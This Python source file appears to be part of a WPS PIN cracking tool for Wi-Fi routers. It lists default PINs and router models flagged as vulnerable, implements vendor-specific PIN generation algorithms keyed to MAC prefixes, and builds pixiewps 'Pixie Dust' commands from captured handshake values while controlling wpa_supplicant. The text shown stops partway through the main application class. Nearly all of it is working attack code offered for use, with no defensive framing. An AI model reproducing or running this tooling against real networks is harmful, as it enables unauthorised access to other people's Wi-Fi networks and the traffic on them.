import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
from datetime import datetime
import csv
from typing import Dict
import hashlib
import argparse
import select

DEFAULT_PINS = [
    "",
    "12345670",
    "12345678",
    "00000000",
    "11111111",
    "78945670",
    "00005678",
    "99999999",
    "78421783",
    "20172527",
    "46264848",
    "76229909",
    "62327145",
    "10864111",
    "31957199",
    "30432031",
    "71412252",
    "68175542",
    "95661469",
    "95719115",
    "48563710",
    "20854836",
    "43977680",
    "05294176",
    "99956042",
    "35611530",
    "67958146",
    "34259283",
    "94229882",
    "95755212"
]
TRIED_PINS = set()


def check_exit():
    if select.select([sys.stdin], [], [], 0)[0]:
        if sys.stdin.readline().strip().lower() == 'ex':
            print("\nAborting…")
            sys.exit(0)


def user_input(prompt):
    resp = input(prompt)
    if resp.lower() == 'ex':
        print("\nAborting…")
        sys.exit(0)
    return resp

vuln_list = [
    "ADSL Router EV-2006-07-27",
    "ADSL RT2860",
    "AIR3G WSC Wireless Access Point AIR3G WSC Device",
    "AirLive Wireless Gigabit AP AirLive Wireless Gigabit AP",
    "Archer_A9 1.0",
    "ArcherC20i 1.0",
    "Archer A2 5.0",
    "Archer A5 4.0",
    "Archer C2 1.0",
    "Archer C2 3.0",
    "Archer C5 4.0",
    "Archer C6 3.20",
    "Archer C6U 1.0.0",
    "Archer C20 1.0",
    "Archer C20 4.0",
    "Archer C20 5.0",
    "Archer C50 1.0",
    "Archer C50 3.0",
    "Archer C50 4.0",
    "Archer C50 5.0",
    "Archer C50 6.0",
    "Archer MR200 1.0",
    "Archer MR200 4.0",
    "Archer MR400 4.2",
    "Archer MR200 5.0",
    "Archer VR300 1.20",
    "Archer VR400 3.0",
    "Archer VR2100 1.0",
    "B-LINK 123456",
    "Belkin AP EV-2012-09-01",
    "DAP-1360 DAP-1360",
    "DIR-635 B3",
    "DIR-819 v1.0.1",
    "DIR-842 DIR-842",
    "DWR-921C3 WBR-0001",
    "D-Link N Router GO-RT-N150",
    "D-Link Router DIR-605L",
    "D-Link Router DIR-615H1",
    "D-Link Router DIR-655",
    "D-Link Router DIR-809",
    "D-Link Router GO-RT-N150",
    "Edimax Edimax",
    "EC120-F5 1.0",
    "EC220-G5 2.0",
    "EV-2009-02-06",
    "Enhanced Wireless Router F6D4230-4 v1",
    "Home Internet Center KEENETIC series",
    "Home Internet Center Keenetic series",
    "Huawei Wireless Access Point RT2860",
    "JWNR2000v2(Wireless AP) JWNR2000v2",
    "Keenetic Keenetic series",
    "Linksys Wireless Access Point EA7500",
    "Linksys Wireless Router WRT110",
    "NBG-419N NBG-419N",
    "Netgear AP EV-2012-08-04",
    "NETGEAR Wireless Access Point NETGEAR",
    "NETGEAR Wireless Access Point R6220",
    "NETGEAR Wireless Access Point R6260",
    "N/A EV-2010-09-20",
    "Ralink Wireless Access Point RT2860",
    "Ralink Wireless Access Point WR-AC1210",
    "RTL8196E",
    "RTL8xxx EV-2009-02-06",
    "RTL8xxx EV-2010-09-20",
    "RTL8xxx RTK_ECOS",
    "RT-G32 1234",
    "Sitecom Wireless Router 300N X2 300N",
    "Smart Router R3 RT2860",
    "Tenda 123456",
    "Timo RA300R4 Timo RA300R4",
    "TD-W8151N RT2860",
    "TD-W8901N RT2860",
    "TD-W8951ND RT2860",
    "TD-W9960 1.0",
    "TD-W9960 1.20",
    "TD-W9960v 1.0",
    "TD-W8968 2.0",
    "TEW-731BR TEW-731BR",
    "TL-MR100 1.0",
    "TL-MR3020 3.0",
    "TL-MR3420 5.0",
    "TL-MR6400 3.0",
    "TL-MR6400 4.0",
    "TL-WA855RE 4.0",
    "TL-WR840N 4.0",
    "TL-WR840N 5.0",
    "TL-WR840N 6.0",
    "TL-WR841N 13.0",
    "TL-WR841N 14.0",
    "TL-WR841HP 5.0",
    "TL-WR842N 5.0",
    "TL-WR845N 3.0",
    "TL-WR845N 4.0",
    "TL-WR850N 1.0",
    "TL-WR850N 2.0",
    "TL-WR850N 3.0",
    "TL-WR1042N EV-2010-09-20",
    "Trendnet router TEW-625br",
    "Trendnet router TEW-651br",
    "VN020-F3 1.0",
    "VMG3312-T20A RT2860",
    "VMG8623-T50A RT2860",
    "WAP300N WAP300N",
    "WAP3205 WAP3205",
    "Wi-Fi Protected Setup Router RT-AC1200G+",
    "Wi-Fi Protected Setup Router RT-AX55",
    "Wi-Fi Protected Setup Router RT-N10U",
    "Wi-Fi Protected Setup Router RT-N12",
    "Wi-Fi Protected Setup Router RT-N12D1",
    "Wi-Fi Protected Setup Router RT-N12VP",
    "Wireless Access Point .",
    "Wireless Router 123456",
    "Wireless Router RTL8xxx EV-2009-02-06",
    "Wireless Router Wireless Router",
    "Wireless WPS Router <#ZVMODELVZ#>",
    "Wireless WPS Router RT-N10E",
    "Wireless WPS Router RT-N10LX",
    "Wireless WPS Router RT-N12E",
    "Wireless WPS Router RT-N12LX",
    "WN3000RP V3",
    "WN-200R WN-200R",
    "WPS Router (5G) RT-N65U",
    "WPS Router DSL-AC51",
    "WPS Router DSL-AC52U",
    "WPS Router DSL-AC55U",
    "WPS Router DSL-N14U-B1",
    "WPS Router DSL-N16",
    "WPS Router DSL-N17U",
    "WPS Router RT-AC750",
    "WPS Router RT-AC1200",
    "WPS Router RT-AC1200_V2",
    "WPS Router RT-AC1750",
    "WPS Router RT-AC750L",
    "WPS Router RT-AC1750U",
    "WPS Router RT-AC51",
    "WPS Router RT-AC51U",
    "WPS Router RT-AC52U",
    "WPS Router RT-AC52U_B1",
    "WPS Router RT-AC53",
    "WPS Router RT-AC57U",
    "WPS Router RT-AC65P",
    "WPS Router RT-AC85P",
    "WPS Router RT-N11P",
    "WPS Router RT-N12E",
    "WPS Router RT-N12E_B1",
    "WPS Router RT-N12 VP",
    "WPS Router RT-N12+",
    "WPS Router RT-N14U",
    "WPS Router RT-N56U",
    "WPS Router RT-N56UB1",
    "WPS Router RT-N65U",
    "WPS Router RT-N300",
    "WR5570 2011-05-13",
    "ZyXEL NBG-416N AP Router",
    "ZyXEL NBG-416N AP Router NBG-416N",
    "ZyXEL NBG-418N AP Router",
    "ZyXEL NBG-418N AP Router NBG-418N",
    "ZyXEL Wireless AP Router NBG-417N",
    "Modem/Router EV-2010-09-20",
    "RB06 RT2860",
    "RB03 RT2860"
]
try:
    import wcwidth as _wc
    def _str_width(s):
        try:
            return _wc.wcswidth(s)
        except Exception:
            return len(s)
except Exception:
    def _str_width(s):
        return len(s)

class NetworkAddress:
    def __init__(self, mac):
        self._serial = None
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            mac, serial = self._split_mac_serial(mac)
            self._serial = serial
            mac_fmt = mac.replace('-', ':').replace('.', ':').strip().upper()
            self._int_repr = self._mac2int(mac_fmt)
            self._str_repr = self._int2mac(self._int_repr)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        mac, serial = self._split_mac_serial(value)
        mac_fmt = mac.replace('-', ':').replace('.', ':').strip().upper()
        self._serial = serial
        self._int_repr = self._mac2int(mac_fmt)
        self._str_repr = self._int2mac(self._int_repr)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    @property
    def serial(self):
        return self._serial

    @serial.setter
    def serial(self, value):
        self._serial = value

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer += other
        return self

    def __isub__(self, other):
        self.integer -= other
        return self

    def __eq__(self, other):
        return self.integer == other.integer

    def __ne__(self, other):
        return self.integer != other.integer

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    @staticmethod
    def _split_mac_serial(value):
        if isinstance(value, str) and '#' in value:
            mac, serial = value.split('#', 1)
            return mac, serial.strip() or None
        return value, None

    @staticmethod
    def _mac2int(mac):
        if isinstance(mac, str):
            mac = mac.split('#', 1)[0]
            mac = re.sub(r'[^0-9A-Fa-f]', '', mac)
        return int(mac, 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return mac

    def __repr__(self):
        return 'NetworkAddress(string={}, integer={}, serial={})'.format(
            self._str_repr, self._int_repr, self._serial)


def _split_bssid_serial(value: str):
    if not value:
        return '', None
    if isinstance(value, str) and '#' in value:
        mac, serial = value.split('#', 1)
        return mac.strip(), serial.strip() or None
    return value.strip(), None


def canonical_bssid(bssid: str) -> str:
    mac, _ = _split_bssid_serial(bssid)
    mac_hex = re.sub(r'[^0-9A-Fa-f]', '', mac)
    if len(mac_hex) != 12:
        return mac.lower()
    formatted = ':'.join(mac_hex[i:i+2] for i in range(0, 12, 2))
    return formatted.lower()


def bssid_storage_name(bssid: str) -> str:
    return canonical_bssid(bssid).replace(':', '').upper()

class WPSpin:
    """WPS pin generator"""
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
                      'pinArcadyan': {'name': 'Arcadyan (Belkin/Arcadyan)', 'mode': self.ALGO_MAC, 'gen': self.pinArcadyan},
                      'pinEasyBox': {'name': 'Vodafone EasyBox (Arcadyan)', 'mode': self.ALGO_MAC, 'gen': self.pinEasyBox},
                      'pinLivebox': {'name': 'Orange Livebox (Arcadyan)', 'mode': self.ALGO_MAC, 'gen': self.pinLivebox},
                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
                      'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
                      'pinActiontecQ1000': {'name': 'Actiontec Q1000', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
                      'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
                      'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
                      'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
                      'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
                      'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
                      'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
                      'pinNetgearCG3000': {'name': 'Netgear CG3000 (Optus)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
                      'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
                      'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
                      'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
                      'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
                      'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
                      'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
                      'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
                      'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
                      'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
                      'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
                      'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
                      'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
                      'pinThomsonTG782T': {'name': 'Thomson TG782T', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7842178},
                      'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
                      'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
                      'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}}

    @staticmethod
    def checksum(pin):
        """
        Standard WPS checksum algorithm.
        @pin — A 7 digit pin to calculate the checksum for.
        Returns the checksum value.
        """
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        """
        WPS pin generator
        @algo — the WPS pin algorithm ID
        Returns the WPS pin string value
        """
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getAll(self, mac, get_static=True):
        """
        Get all WPS pin's for single MAC
        """
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getList(self, mac, get_static=True):
        """
        Get all WPS pin's for single MAC as list
        """
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            res.append(self.generate(ID, mac))
        return res

    def getSuggested(self, mac):
        """
        Get all suggested WPS pin's for single MAC
        """
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getSuggestedList(self, mac):
        """
        Get all suggested WPS pin's for single MAC as list
        """
        algos = self._suggest(mac)
        res = []
        for algo in algos:
            res.append(self.generate(algo, mac))
        return res

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        if res:
            return res[0]
        else:
            return None

    def _suggest(self, mac):
        """
        Get algos suggestions for single MAC
        Returns the algo ID
        """
        mac = mac.replace(':', '').upper()
        algorithms = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
            'pinArcadyan': ('38229D', '402CF4', 'C83A35', 'EC1A59', 'EC233D', 'F8D111'),
            'pinEasyBox': ('001A2A', '002240', '00224D', 'C83A35', 'EC233D'),
            'pinLivebox': ('A0F3C1', 'D86CE9', 'EC1A59', 'F80D60'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
            'pinActiontecQ1000': ('0015A8', '00236C', '00E0FC'),
            'pinNetgearCG3000': ('00184D', '001E2A', '0024B2'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinThomsonTG782T': ('001D68', '001F9F', '00247F'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
            'pinONO': ('5C353B', 'DC537C')
        }
        res = []
        for algo_id, masks in algorithms.items():
            if mac.startswith(masks):
                res.append(algo_id)
        return res

    def pin24(self, mac):
        return mac.integer & 0xFFFFFF

    def pin28(self, mac):
        return mac.integer & 0xFFFFFFF

    def pin32(self, mac):
        return mac.integer % 0x100000000

    def pinDLink(self, mac):
        nic = mac.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)
        return pin

    @staticmethod
    def _mac_nibbles(mac):
        mac_hex = mac.string.replace(':', '')
        return [int(h, 16) for h in mac_hex]

    def _arcadyan_serial_suffix(self, mac):
        digits = []
        if mac.serial:
            digits = [int(ch) for ch in mac.serial if ch.isdigit()]
        fallback = [int(ch) for ch in f"{mac.integer & 0xFFFFFF:05d}"]
        if digits:
            digits = (fallback + digits)[-5:]
        else:
            digits = fallback
        if len(digits) < 5:
            digits = ([0] * (5 - len(digits))) + digits
        return digits[-5:]

    def _arcadyan_pin(self, mac):
        nibbles = self._mac_nibbles(mac)
        if len(nibbles) != 12:
            raise ValueError('Invalid MAC format for Arcadyan algorithm')
        serial_suffix = self._arcadyan_serial_suffix(mac)
        serial_digits = [0] * 10
        serial_digits[5:] = serial_suffix
        k1 = (serial_digits[6] + serial_digits[7] + nibbles[10] + nibbles[11]) & 0xF
        k2 = (serial_digits[8] + serial_digits[9] + nibbles[8] + nibbles[9]) & 0xF
        hpin = [0] * 7
        hpin[0] = k1 ^ serial_digits[9]
        hpin[1] = k1 ^ serial_digits[8]
        hpin[2] = k2 ^ nibbles[9]
        hpin[3] = k2 ^ nibbles[10]
        hpin[4] = nibbles[10] ^ serial_digits[9]
        hpin[5] = nibbles[11] ^ serial_digits[8]
        hpin[6] = k1 ^ serial_digits[7]
        pin = int(''.join(f"{x:X}" for x in hpin), 16)
        return pin % 10000000

    def pinArcadyan(self, mac):
        return self._arcadyan_pin(mac)

    def pinEasyBox(self, mac):
        return self._arcadyan_pin(mac)

    def pinLivebox(self, mac):
        return self._arcadyan_pin(mac)

def recvuntil(pipe, what):
    s = ''
    while True:
        check_exit()
        inp = pipe.stdout.read(1)
        if inp == '':
            return s
        s += inp
        if what in s:
            return s

def get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()

class PixiewpsData:
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return (self.pke and self.pkr and self.e_nonce and self.authkey
                and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range=False):
        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {}"\
                    " --e-hash2 {} --authkey {} --e-nonce {}".format(
                    self.pke, self.pkr, self.e_hash1,
                    self.e_hash2, self.authkey, self.e_nonce)
        if full_range:
            pixiecmd += ' --force'
        return pixiecmd

class ConnectionStatus:
    def __init__(self):
        self.status = ''
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''
        self.bssid = ''

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def clear(self):
        self.__init__()

class Companion:
    """Main application part"""
    def __init__(self, interface, save_result=False, print_debug=False, bssid=''):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug

        self.base_dir = pathlib.Path.cwd()

        self.tempdir = tempfile.mkdtemp(prefix='oneshot-', dir=str(self.base_dir))
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False, dir=self.tempdir) as temp:
            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.__init_wpa_supplicant()

        sock_fd, sock_path = tempfile.mkstemp(prefix='oneshot-sock-', dir=self.tempdir)
        os.close(sock_fd)
        os.unlink(sock_path)
        self.res_socket_file = sock_path
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        self.sessions_dir = str(self.base_dir / 'sessions')
        self.pixiewps_dir = str(self.base_dir / 'pixiewps')
        self.reports_dir = str(self.base_dir / 'reports')
        if not os.path.exists(self.sessions_dir):
            os.makedirs(self.sessions_dir)
        if not os.path.exists(self.pixiewps_dir):
            os.makedirs(self.pixiewps_dir)

        self.generator = WPSpin()

        self.bssid = canonical_bssid(bssid)
        self.lastPwr = 0

    def __init_wpa_supplicant(self):
        print('[*] Running wpa_supplicant…')
        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        while True:
            check_exit()
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                raise ValueError('wpa_supplicant returned an error: ' + self.wpas.communicate()[0])
            if os.path.exists(self.wpas_ctrl_path):
                break
            time.sleep(.1)

    def sendOnly(self, command):
        """Sends command to wpa_supplicant"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        """Sends command to wpa_supplicant and returns the reply"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, address) = self.retsock.recvfrom(4096)
        inmsg = b.decode('utf-8', errors='replace')
        return inmsg

    @staticmethod
    def _explain_wpas_not_ok_status(command: str, respond: str):
        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return ('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
                        'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
        return '[!] Something went wrong — check out debug log'

